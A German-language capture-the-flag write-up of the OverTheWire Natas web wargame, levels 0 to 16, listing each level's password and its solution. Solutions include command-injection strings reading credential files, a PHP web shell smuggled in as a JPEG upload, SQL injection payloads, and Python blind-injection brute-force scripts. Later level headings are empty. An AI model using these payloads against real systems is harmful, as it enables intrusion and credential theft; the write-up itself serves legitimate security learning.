---
title: "OverTheWire Natas WriteUp - Level 0 bis 14"
date: 2018-02-13T21:27:56+01:00
toc: false
images:
tags:
  - overthewire
  - ctf
  - german
---

## **Einleitung Wargames**

[OverTheWire.org](http://overthewire.org/wargames/) bietet über 15 verschiedene Wargames an, welche verschiedene Schwierigskeitgrade haben. Wenn du den Begriff "Wargame" im Bezug zu Cyber Security zum ersten Mal hörst, fragst du dich bestimmt: "Was ist eigentlich ein Wargame?".  
Wargames sind Herausforderungen, entweder online oder offline als Virtuelle Maschine, in denen man versucht Sicherheitslücken auszunutzen und/oder Zugriff zu etwas zu erlangen. Sie sind teilweise sehr unterschiedlich was die benötigten Fähigkeiten, die Herausforderung und die Vorgehensweise anbelangt. Wargames werden von verschiedenen Internetseiten angeboten und haben teilweise eine große Community. Eine Liste von Wargame Anbietern kannst du [hier](https://github.com/apsdehal/awesome-ctf#wargames) finden.

## **Level 0**

Nachdem wir uns auf [http://natas0.natas.labs.overthewire.org/](http://natas0.natas.labs.overthewire.org/) mit dem Nutzernamen **natas0** und Password **natas0** angemeldet haben, sehen wir eine Seite mit dem Text **You can find the password for the next level on this page.**.  Wenn wir uns den Seitenquelltext anzeigen lassen, finden wir bei Zeile 16 folgendes:

```shell
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

## **Level 0 -> Level 1**

Diesmal ist das Password für das nächste Level wieder im Seitenquelltext versteckt, allerdings wird der Rechtsklick der Maus blockiert. Das ist aber kein Problem für uns, da wir mit **Strg + U** uns trotzdem den Seitenquelltext anzeigen lassen können. Bei Zeile 17 finden wir dann folgendes:

```shell
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## **Level 1 -> Level 2**

Wir sehen uns wieder zuerst den Seitenquelltext an. In Zeile 15 finden wir folgendes:

```shell
<img src="files/pixel.png">
```

Wenn wir nach **http://natas2.natas.labs.overthewire.org/files/** gehen, sehen wir dort eine Datei **users.txt**.  
In dieser steht:

```shell
# username:password
[...]
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
[...]
```


## **Level 2 -> Level 3**

Wenn wir uns den Seitenquelltext ansehen, finden wir diesmal nur den Kommentar **<\!-- No more information leaks!! Not even Google will find it this time... -->**.  
Sehen wir uns doch mal die [robots.txt](http://natas3.natas.labs.overthewire.org/robots.txt) Datei an, welche bestimmte User-Agenten ausschließen kann, z.B. auch die Bots von Suchmaschinen.

```shell
User-agent: *
Disallow: /s3cr3t/
```

Der Ordner **/s3cr3t/** wird also von Suchmaschinen ausgeschlossen... Sehen wir uns diesen mal an.  
In dem Ordner befindet sich die Datei Users.txt mit dem Inhalt:

```shell
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```



## **Level 3 -> Level 4**

Bei diesem Level müssen wir den [Referrer](https://de.wikipedia.org/wiki/Referrer) veränder. Um das zu machen brauchen wir die Hilfe von Burp. Mit Burp können wir den Datenverkehr unterbrechen und Anfragen bearbeiten.  
Wenn wir auf **Refresh Page** klicken und Burp gerade unseren Verkehr unterbricht, können wir unter **headers** den Referrer von **natas4** zu **natas5** ändern.

[![burp](https://imgur.com/ywmvc52.jpg)](https://imgur.com/ywmvc52)

Danach müssen wir das Request nur noch weiterleiten und schon wird uns das Passwort angezeigt.

```shell
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```


## **Level 4 -> Level 5**

Wenn wir uns einloggen, steht auf der Seite, dass wir keinen Zugriff haben, weil wir nicht eingeloggt sind. Das könnte eventuell daran liegen, dass ein Cookie falsch gesetzt ist.  
Mit dem Browser Addon **EditThisCookie **können wir den Inhalt von Cookies sehen und bearbeiten.

[![editthiscookie](https://imgur.com/v3q6uJ3.jpg)](https://imgur.com/v3q6uJ3)

Es gibt also einen Cookie der **loggedin** heißt  und den Wert **0** besitzt. Wenn wir den Wert auf **1** setzen und die Seite neu laden, wird uns das Passwort für das nächste Level angezeigt.

```shell
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## **Level 5 -> Level 6**

Bei diesem Level hier müssen wir das richtige Password für das für **Input Secret** finden. Im Quelltext steht in Zeile 17:

```shell
include "includes/secret.inc";
```

Wenn wir nun zu **http://natas6.natas.labs.overthewire.org/includes/secret.inc** gehen, finden wir:

```php
$secret = "FOEIUWGHFEEUHOFUOIU";
```

Jetzt müssen wir nur noch das Secret einfügen, absenden und geschafft.

```shell
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## **Level 6 -> Level 7**

Im Seitenquelltext steht in Zeile 21:

```shell
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

Wenn wir auf **Home** klicken sehen wir die URL **http://natas7.natas.labs.overthewire.org/index.php?page=home**

Hier können wir eine [LFI/RFI](http://wiki.hackerboard.de/index.php/LFI_%26_RFI) Schwachstelle ausnutzen. Dafür müssen wir nur folgende URL eingeben:

```shell
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

Jetzt wird uns das Password angezeigt: **DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe**


## **Level 7 -> Level 8**

Im Seitenquelltext sehen wir, dass unser Input mit der Variable **$encodedSecret** verglichen wird. Dazu wird unser Input erst in Base64 enkodiert, dann umgedreht und schließlich werden die Binär Daten in Hex konvertiert. Um an das richtige Secret zu kommen, müssen wir diesen Prozess umkehren.

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

Dazu können wir den Interactiven Modus von PHP benutzen:

```shell
root@kali:~# php7.2 -a
Interactive mode enabled

php > echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
oubWYf2kBq
```

Das Secret ist also **oubWYf2kBq**.

```shell
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

## **Level 8 -> Level 9**

In Zeile 29 vom Quelltext finden wir folgendes: **passthru("grep -i $key dictionary.txt");** Wobei **$key** unser Input ist.  
Es wird also ein Linux Befehl ausgeführt. Das können wir ausnutzen. Suchen wir zum Testen mal nach **; ls**.  
Durch das Semikolon wird der **grep**-Befehl beendet und **ls** wird ausgeführt. Unter **/etc/natas_webpass** befinden sich die Passwörter für alle Level.  
Wir haben immer nur die Rechte, die Datei für das derzeitige und das nächste Level zu lesen. Benutzen wir:

```shell
; ls ../../../../etc/natas_webpass
```

Als Ausgabe werden uns die Passwort-Dateien aller Level aufgelistet. Lassen wir uns **natas10** doch mit **cat** ausgeben.

```shell
;cat ../../../../etc/natas_webpass/natas10
```

```shell
Output: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

## **Level 9 -> Level 10**

Die Zeichen **;** und **&** werden in diesem Level gefiltert, weswegen wir hier nicht wie in Level 9 vorgehen können.  
Allerdings können wir uns **grep** von nutzen machen. Der Befehl grep -i nimmt als ersten Parameter das Suchwort und alle danach folgenden als Datei in der gesucht werden soll. Also können wir einfach **/etc/natas_webpass/natas11** als zu durchsuchende Datei hinzunehmen.

Geben wir **a /etc/natas_webpass/natas11** ein...  
Der Buchstabe **a** scheint nicht im Passwort vorhanden zu sein.

Probieren wir **u /etc/natas_webpass/natas11** aus.

```shell
Output:
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
[...]
```

## **Level 10 -> Level 11**

Bei diesem Level haben wir einen XOR Verschlüsselten Cookie, welchen wir verändern müssen.  
Der Quelltext ist wie folgt:

```php
[...]  
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {  
  $key = '<censored>';  
  $text = $in;  
  $outText = '';

  // Iterate through each character  
  for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
  }

  return $outText;  
}

function loadData($def) {  
  global $_COOKIE;  
  $mydata = $def;  
  if(array_key_exists("data", $_COOKIE)) {  
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);  
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {  
      if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {  
        $mydata['showpassword'] = $tempdata['showpassword'];  
        $mydata['bgcolor'] = $tempdata['bgcolor'];  
      }  
    }  
  }  
  return $mydata;  
}

function saveData($d) {  
  setcookie("data", base64_encode(xor_encrypt(json_encode($d))));  
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {  
  if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {  
    $data['bgcolor'] = $_REQUEST['bgcolor'];  
  }  
}

saveData($data);

?>

<h1>natas11</h1>  
<div id="content">  
<body style="background: <?=$data['bgcolor']?>;">  
Cookies are protected with XOR encryption<br/><br/>

<?  
if($data["showpassword"] == "yes") {  
  print "The password for natas12 is <censored><br>";  
}  
[...]  
?>
```

Im Cookie Editor können wir sehen, dass der Cookie **data** den Wert **ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D** enthält.

![cookiemanager](https://imgur.com/Bt7rsUG.jpg)

Außerdem wissen wir dank des Quelltextes wie der entschlüsselte Wert lautet:

**"showpassword"=>"no", "bgcolor"=>"#ffffff"**

Eine **XOR Verschlüsselung** ist einfach zu entschlüsseln, wenn man 2 der 3 folgenden Sachen weiß:

Der **verschlüsselte Text**, der **entschlüsselte Text** und der **Schlüssel** der zum verschlüsseln benutzt wird.  
Wir wissen die ersten beiden Sachen. Wir können nun die **xor_encrypt** Funktion anpassen, um den Schlüssel herauszufinden.

```php
#!/usr/bin/php
<? 
$cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw');

function xor_encrypt($in)
{ 
  $text = $in; 
  $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
  $outText = '';

  // Iterate through each character
  for($i=0;$i<strlen($text);$i++) 
  { 
    $outText .= $text[$i] ^ $key[$i % strlen($key)]; 
  } 
  return $outText; 
} 

print xor_encrypt($cookie); 
?>
```

Wenn wir die Datei nun ausführen erhalten wir: **qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq**

Der Schlüssel ist also **qw8J**

Wenn wir die Funktion erneut etwas anpassen, können wir verschlüsseln, was wir möchten.

```php
>#!/usr/bin/php
<? 
function xor_encrypt($in)
{ 
  $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
  $key = "qw8J";
  $outText = '';

  // Iterate through each characterfor($i=0;$i<strlen($text);$i++) 
  { 
    $outText .= $text[$i] ^ $key[$i % strlen($key)]; 
  } 
  return $outText; 
} 

print base64_encode(xor_encrypt()); ?>
```

Wenn wir die Funktion ausführen erhalten wir den Cookie **ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK**

Ersetzen wir nun den Wert des Cookies **data** damit, müssen wir nur noch die Seite neu laden und es erscheint der Text

**The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3**


## **Level 11 -> Level 12**

Bei diesem Level können wir eine JPEG Datei hochladen. Sehen wir uns mal den Quelltext an.

```php
function genRandomString() {
  $length = 10;
  $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
  $string = "";

  for ($p = 0; $p < $length; $p++) {
    $string .= $characters[mt_rand(0, strlen($characters)-1)];
  }

  return $string;
  }

  function makeRandomPath($dir, $ext) {
  do {
    $path = $dir."/".genRandomString().".".$ext;
  } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
  $ext = pathinfo($fn, PATHINFO_EXTENSION);
  return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
  $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
  echo "File is too big";
} else {
  if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
    echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
  } else{
    echo "There was an error uploading the file, please try again!";
  }
}
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
```

Wenn wir eine Datei hochladen, wird bekommt diese einen zufälligen 10-stelligen Namen, die Endung **.jpg** und wird unter **/upload/** gespeichert. Den Link zu der Datei bekommen wir danach angezeigt. Wir können ein PHP-Skript erstellen, welches für uns ein System-Kommando ausführt und müssen dafür sorgen, dass es mit der Endung **.php** in dem Ordner **/upload/** gespeichert wird und nicht mit der Endung **.jpg**.

```shell
echo "<?php system(\"cat /etc/natas_webpass/natas13\"); ?>" > cutecat.jpg
```

Durch dieses Kommando erstellen wir ein PHP-Skript welches auf dem Server **cat /etc/natas_webpass/natas13** ausführen wird. Das **\\** ist bei **echo** ein escape character. Ohne das \ würde der echo Befehl bei **system("** enden. **system** führt bei PHP ein System Kommando aus und gibt den Output aus. Wird speichern das PHP-Skript als **cutecat.jpg** ab, wobei die Endung bei diesem Beispiel egal ist, da die Datei eh umbenannt wird und die Seite die Datei nicht auf ihre Endung überprüft.

Es gibt verschiedene Möglichkeiten, wie wir dafür sorgen können, dass unsere Datei nun als **.php** gespeichert wird.

Zum einen können wir **Strg** + **Umschalt** + **I** drücken um die Elemente der Seite zu untersuchen. Dann suchen wir nach dem verstecktem Input-Feld und können dort den Wert von **filename** ändern.

[![Element untersuchen](https://imgur.com/AB3zREf.jpg)](https://imgur.com/AB3zREf)

Danach müssen wir nur noch auf **Upload File** klicken, die Datei wird unter dem Namen gespeichert, welchen wir festgelegt haben und wenn wir durch den Link, welcher uns angezeigt wird, die Datei ausführen, bekommen wir das Passwort angezeigt.

Alternativ können wir auch Burp benutzen. Wenn wir das Upload Anfrage abfangen, können wir dort auch den Dateinamen ändern.

[![Burp](https://imgur.com/pV7pVjS.jpg)](https://imgur.com/pV7pVjS)

Wenn alles geklappt hat, bekommen wir das Password angzeigt.

```shell
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## **Level 12 -> Level 13**

Dieses Level ist eine Erweiterung zum vorherigen. Der Quelltext hat drei neue Zeilen dazu bekommen.

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
    echo "File is not an image"; 
}
```

Jetzt wird bei der Datei, welche wir hochladen, zusätzlich überprüft um was für einen Bildtyp es sich bei der Datei handelt. Dies wird durch **exif_imagetype(datei)** realisiert. **exif_imagetype** liest die ersten Bytes der Datei aus und überprüft anhand der Signatur um welchen Dateityp es sich handelt. Wenn wir etwas anderes als eine Bilddatei hochladen erhalten wir nur die Rückmeldung **File is not an image**.

```shell
root@kali:~# file cutecat.jpg 
cutecat.jpg: PHP script, ASCII text
```

Auf Wikipedia können wir eine [Liste mit Signatur für verschiedene Dateitypen](https://en.wikipedia.org/wiki/List_of_file_signatures) finden. Die Signatur für JPEGs ist **FF D8 FF DB**.

Hier gibt es auch wieder verschiedene Möglichkeiten, wie wir die Signatur an den Anfang unserer Datei einfügen können, sodass diese als JPEG erkannt wird.

1.

```shell
root@kali:~# echo -e "\xff\xd8\xff\xe0" > jpeg
root@kali:~# file jpeg
jpeg: JPEG image data
```

Dadurch haben wir nun die JPEG Signatur in der Datei **jpeg** gespeichert. Jetzt müssen wir nur noch unser PHP-Skript erstellen und die beiden Dateien zusammenführen.

```shell
root@kali:~# echo "<?php system(\"cat /etc/natas_webpass/natas14\"); ?>" > cutecat
root@kali:~# cat jpeg cutecat > cutecatjpg
root@kali:~# file cutecatjpg
cutecat2: JPEG image data
```

2. Wir können auch den Hexeditor dafür benutzen.

```shell
root@kali:~# hexeditor -b cutecat
```

Viermal **Strg + A** drücken um null-Bytes zu erstellen, **FF D8 FF DB** eingeben und mit **Strg + X** speichern.

[![hexeditor](https://imgur.com/l2oziBm.jpg)](https://imgur.com/l2oziBm)

```shell
root@kali:~# file cutecat
cutecat: JPEG image data
```

3. Wir laden unser Skript ganz normal hoch und fangen die Anfrage mit Burp ab. Wir kopieren dann die ASCII Kodierung der Signatur von Wikipedia und fügen diese vor dem Inhalt unserer Datei ein.

[![kopieren](https://imgur.com/gqLbyb1.jpg)](https://imgur.com/gqLbyb1)

[![einfügen bei burp](https://imgur.com/EItixfp.jpg)](https://imgur.com/EItixfp)

Natürlich dürfen wir nicht vergessen, wie im vorherigen Level, dafür zu sorgen, dass unsere Datei wieder mit der Endung **.php** gespeichert wird. Wenn alles funktioniert hat, bekommen wir wieder das Passwort angezeigt, wenn wir dem Link zu unserer Datei folgen.

```shell
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```


## **Level 13 -> Level 14**

Sehen wir uns den Quelltext an:

```php
[...]
if(array_key_exists("username", $_REQUEST)) 
  { 
  $link = mysql_connect('localhost', 'natas14', '<censored>'); 
  mysql_select_db('natas14', $link); 
  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
  if(array_key_exists("debug", $_GET)) 
  { 
    echo "Executing query: $query<br>"; 
  } 
  if(mysql_num_rows(mysql_query($query, $link)) > 0) 
  { 
    echo "Successful login! The password for natas15 is <censored><br>"; 
  } 
  else 
  { 
    echo "Access denied!<br>"; 
  } 
  mysql_close($link);
[...]
```

Wir können die genaue SQL Abfrage sehen, welche gemacht wird:

```sql
SELECT * FROM users WHERE username="USER_INPUT" AND password="USER_INPUT"
```

Wir können nun eine ganz einfache SQL Injection machen, um an das Passwort zu kommen  
```sql
username=test" OR "1"="1  
password=test" OR "1"="1
```

Dadurch erhalten wir folgende SQL Abfrage

```sql
SELECT * FROM users WHERE username="test" OR "1"="1" AND password="test" OR "1"="1"
```

Wir werden also also als irgendein beliebiger Benutzer eingeloggt.

```shell
http://natas14.natas.labs.overthewire.org/?username=test" OR "1"="1&password=test" OR "1"="1
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## **Level 14 -> Level 15**

```shell
root@kali:~# vim bruteforce.py
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
correct = ''
passwd = ''

for char in chars:
Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
if 'exists' in r.text :
correct += char
print(correct)

for i in range(0,32):
for char in correct:
Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
if 'exists' in r.text :
passwd += char
print(passwd)
break
```

```shell
root@kali:~# python bruteforce.py
a
ac
ace
aceh
acehi
acehij
acehijm
acehijmn
acehijmnp
acehijmnpq
acehijmnpqt
acehijmnpqtw
acehijmnpqtwB
acehijmnpqtwBE
acehijmnpqtwBEH
acehijmnpqtwBEHI
acehijmnpqtwBEHIN
acehijmnpqtwBEHINO
acehijmnpqtwBEHINOR
acehijmnpqtwBEHINORW
acehijmnpqtwBEHINORW0
acehijmnpqtwBEHINORW03
acehijmnpqtwBEHINORW035
acehijmnpqtwBEHINORW0356
acehijmnpqtwBEHINORW03569
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
WaIHEacj63
WaIHEacj63w
WaIHEacj63wn
WaIHEacj63wnN
WaIHEacj63wnNI
WaIHEacj63wnNIB
WaIHEacj63wnNIBR
WaIHEacj63wnNIBRO
WaIHEacj63wnNIBROH
WaIHEacj63wnNIBROHe
WaIHEacj63wnNIBROHeq
WaIHEacj63wnNIBROHeqi
WaIHEacj63wnNIBROHeqi3
WaIHEacj63wnNIBROHeqi3p
WaIHEacj63wnNIBROHeqi3p9
WaIHEacj63wnNIBROHeqi3p9t
WaIHEacj63wnNIBROHeqi3p9t0
WaIHEacj63wnNIBROHeqi3p9t0m
WaIHEacj63wnNIBROHeqi3p9t0m5
WaIHEacj63wnNIBROHeqi3p9t0m5n
WaIHEacj63wnNIBROHeqi3p9t0m5nh
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

## **Level 15 -> Level 16**

```python
root@kali:~# vim bruteforce2.py
import requests 
from requests.auth import HTTPBasicAuth 

auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh') 

correct = '' 
passwd = '' 
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890' 
for char in allchars: 
 r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=anything$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth) 

 if 'anything' not in r.text: 
 correct += char 
 print(correct) 

for i in range(32): 
 for char in correct: 
 r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=anything$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth) 

 if 'anything' not in r.text: 
 passwd = passwd + char 
 print(passwd) 
 break
```

```shell
root@kali:~# python bruteforce2.py 
b
bc
bcd
bcdg
bcdgh
bcdghk
bcdghkm
bcdghkmn
bcdghkmnq
bcdghkmnqr
bcdghkmnqrs
bcdghkmnqrsw
bcdghkmnqrswA
bcdghkmnqrswAG
bcdghkmnqrswAGH
bcdghkmnqrswAGHN
bcdghkmnqrswAGHNP
bcdghkmnqrswAGHNPQ
bcdghkmnqrswAGHNPQS
bcdghkmnqrswAGHNPQSW
bcdghkmnqrswAGHNPQSW3
bcdghkmnqrswAGHNPQSW35
bcdghkmnqrswAGHNPQSW357
bcdghkmnqrswAGHNPQSW3578
bcdghkmnqrswAGHNPQSW35789
bcdghkmnqrswAGHNPQSW357890
8
8P
8Ps
8Ps3
8Ps3H
8Ps3H0
8Ps3H0G
8Ps3H0GW
8Ps3H0GWb
8Ps3H0GWbn
8Ps3H0GWbn5
8Ps3H0GWbn5r
8Ps3H0GWbn5rd
8Ps3H0GWbn5rd9
8Ps3H0GWbn5rd9S
8Ps3H0GWbn5rd9S7
8Ps3H0GWbn5rd9S7G
8Ps3H0GWbn5rd9S7Gm
8Ps3H0GWbn5rd9S7GmA
8Ps3H0GWbn5rd9S7GmAd
8Ps3H0GWbn5rd9S7GmAdg
8Ps3H0GWbn5rd9S7GmAdgQ
8Ps3H0GWbn5rd9S7GmAdgQN
8Ps3H0GWbn5rd9S7GmAdgQNd
8Ps3H0GWbn5rd9S7GmAdgQNdk
8Ps3H0GWbn5rd9S7GmAdgQNdkh
8Ps3H0GWbn5rd9S7GmAdgQNdkhP
8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

## **Level 16 -> Level 17**

## **Level 17 -> Level 18**

## **Level 18 -> Level 19**

## **Level 19 -> Level 20**

## **Level 20 -> Level 21**

## **Level 21 -> Level 22**

## **Level 22 -> Level 23**

## **Level 23 -> Level 24**

## **Level 24 -> Level 25**

## **Level 25 -> Level 26**

## **Level 26 -> Level 27**

## **Level 27 -> Level 28**

## **Level 28 -> Level 29**

## **Level 29 -> Level 30**

## **Level 30 -> Level 31**

## **Level 31 -> Level 32**

## **Level 32 -> Level 33**
